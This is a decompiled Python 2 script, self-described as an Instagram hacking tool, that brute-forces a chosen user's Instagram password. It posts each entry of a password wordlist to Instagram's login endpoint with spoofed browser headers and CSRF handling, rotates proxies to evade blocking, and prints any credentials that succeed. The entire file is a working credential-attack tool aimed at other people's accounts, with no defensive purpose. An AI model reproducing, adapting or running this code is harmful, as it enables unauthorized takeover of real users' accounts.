# uncompyle6 version 3.6.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:28:22) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
"""
TODO LIST:
        Fix and make proxy function better
        Sort code again
        Add help function to all "Yes/no" questions
        Add help  function to "Press enter to exit input"
"""
import requests, json, time, os, random, sys
logo = '\n\x1b[91;1m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[91;1m \xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\n\x1b[91;1m \xe2\x96\x88\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[91;1m \xe2\x96\x88          \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88\n\x1b[91;1m \xe2\x96\x88\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2   \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[91;1m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \x1b[97;1mHACK INSTAGRAM TOOLS BY \x1b[91;1mSAYDOG\x1b[91;1m\n\x1b[91;1m   \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88 \n'

def Input(text):
    value = ''
    if sys.version_info.major > 2:
        value = input(text)
    else:
        value = raw_input(text)
    return str(value)


class Instabrute:

    def __init__(self, username, passwordsFile='pass.txt'):
        self.username = username
        self.CurrentProxy = ''
        self.UsedProxys = []
        self.passwordsFile = passwordsFile
        self.loadPasswords()
        self.IsUserExists()
        UsePorxy = Input('\x1b[91;1m[*] \x1b[97;1mAre you using proxy (y/n) \x1b[91;1m> \x1b[33;1m').upper()
        if UsePorxy == 'Y' or UsePorxy == 'YES':
            self.randomProxy()

    def loadPasswords(self):
        if os.path.isfile(self.passwordsFile):
            with open(self.passwordsFile) as (f):
                self.passwords = f.read().splitlines()
                passwordsNumber = len(self.passwords)
                if passwordsNumber > 0:
                    print '\x1b[91;1m[*]\x1b[97;1m Wordlist detected \x1b[91;1m        > \x1b[33;1m%s' % passwordsNumber
                else:
                    print 'Password file are empty, Please add passwords to it.'
                    Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
                    exit()
        else:
            print '\x1b[91;1mPlease create passwords file named "%s"' % self.passwordsFile
            Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
            exit()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)
        if proxy not in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        try:
            print ''
            print '\x1b[91;1m[*] \x1b[97;1mChecking new ip \x1b[91;1m...'
            print '\x1b[91;1m[*] \x1b[91;1mYour public ip\x1b[91;1m %s' % requests.get('http://myexternalip.com/raw', proxies={'http': proxy, 'https': proxy}, timeout=10.0).text
        except Exception as e:
            print '\x1b[91;1m[!] \x1b[97;1mCan\'t reach proxy \x1b[91;1m"%s"' % proxy
            print ''

    def IsUserExists(self):
        r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
        if r.status_code == 404:
            print '\x1b[91;1m[*] \x1b[97;1mUsername "%s" not found\x1b[91;1m !' % username
            Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
            exit()
        elif r.status_code == 200:
            return True

    def Login(self, password):
        sess = requests.Session()
        if len(self.CurrentProxy) > 0:
            sess.proxies = {'http': self.CurrentProxy, 'https': self.CurrentProxy}
        sess.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '', 'ds_user_id': ''})
        sess.headers.update({'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36', 
           'x-instagram-ajax': '1', 
           'X-Requested-With': 'XMLHttpRequest', 
           'origin': 'https://www.instagram.com', 
           'ContentType': 'application/x-www-form-urlencoded', 
           'Connection': 'keep-alive', 
           'Accept': '*/*', 
           'Referer': 'https://www.instagram.com', 
           'authority': 'www.instagram.com', 
           'Host': 'www.instagram.com', 
           'Accept-Language': 'en-US;q=0.6,en;q=0.4', 
           'Accept-Encoding': 'gzip, deflate'})
        r = sess.get('https://www.instagram.com/')
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
        data = json.loads(r.text)
        if data['status'] == 'fail':
            print data['message']
            UsePorxy = Input('\x1b[91;1m[*] \x1b[97;1mAre you using proxy (y/n) \x1b[91;1m> \x1b[33;1m').upper()
            if UsePorxy == 'Y' or UsePorxy == 'YES':
                print '[$] Try to use proxy after fail.'
                randomProxy()
            return False
        if data['authenticated'] == True:
            return sess
        else:
            return False


os.system('clear')
print logo
print '\x1b[97;1mHack instagram account using Bruteforce'
print '\x1b[97;1mMake sure you have the wordlist \x1b[91;1mpass.txt'
print ''
instabrute = Instabrute(Input('\x1b[91;1m[*] \x1b[97;1mSet username target \x1b[91;1m      > \x1b[33;1m'))
try:
    delayLoop = int(Input('\x1b[91;1m[*] \x1b[97;1mSet delay in second \x1b[91;1m      > \x1b[33;1m'))
except Exception as e:
    print '\x1b[91;1m[*] ERROR \x1b[97;1mDefault delay start on 5 second'
    delayLoop = 4

print '\x1b[91;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
print '\x1b[91;1m  ..:: BRUTEFORCE IS RUNNING ::..'
print '\x1b[91;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
print '\x1b[91;1m[!] \x1b[97;1mPlease wait for a few minute\x1b[91;1m !'
print '\x1b[91;1m[!] \x1b[97;1mExit program just click\x1b[91;1m CTRL+C'
print ''
for password in instabrute.passwords:
    sess = instabrute.Login(password)
    if sess:
        print ''
        print '\x1b[91;1m[\x1b[33;1m\xe2\x9c\x94\x1b[91;1m] \x1b[97;1mLogin success\x1b[33;1m %s' % [instabrute.username, password]
        print ''
    else:
        print '\x1b[91;1m[*] \x1b[97;1mCracking password\x1b[91;1m > %s' % password
    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        WantToExit = str(Input('\x1b[97;1mTrying to Exit progress? (y/n) \x1b[91;1m>\x1b[33;1m ')).upper()
        if WantToExit == 'Y' or WantToExit == 'YES':
            exit()
        else:
            continue